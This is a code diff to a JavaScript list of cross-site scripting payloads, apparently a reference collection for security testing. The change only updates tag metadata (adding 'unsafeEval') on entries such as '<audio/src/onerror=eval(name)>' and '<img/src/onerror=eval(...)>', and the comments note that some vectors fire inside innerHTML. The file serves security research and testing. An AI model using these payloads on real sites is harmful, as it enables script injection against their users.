@@ -83,19 +83,19 @@ const PAYLOADS = [
     },
     {
         html: "<audio/src/onerror=eval(name)>",
-        tags: [TAGS.unsafeInline, TAGS.controlsName],
+        tags: [TAGS.unsafeInline, TAGS.unsafeEval, TAGS.controlsName],
         comment: 'What is special about this payload is that it will work inside innerHTML on elements not yet inserted into the DOM',
         author: '@terjanq'
     },
     {
         html: "<img/src/onerror=eval(`'`+URL)>",
-        tags: [TAGS.unsafeInline, TAGS.controlsURL],
+        tags: [TAGS.unsafeInline, TAGS.unsafeEval, TAGS.controlsURL],
         comment: 'What is special about this payload is that it will work inside innerHTML on elements not yet inserted into the DOM',
         author: null
     },
     {
         html: "<style/onload=eval(name)>",
-        tags: [TAGS.inlineStyleAllow, TAGS.controlsName, TAGS.unsafeEval, TAGS.unsafeInline],
+        tags: [TAGS.inlineStyleAllow, TAGS.unsafeEval, TAGS.unsafeInline, TAGS.controlsName],
         author: null
     },
 /* deprecated */
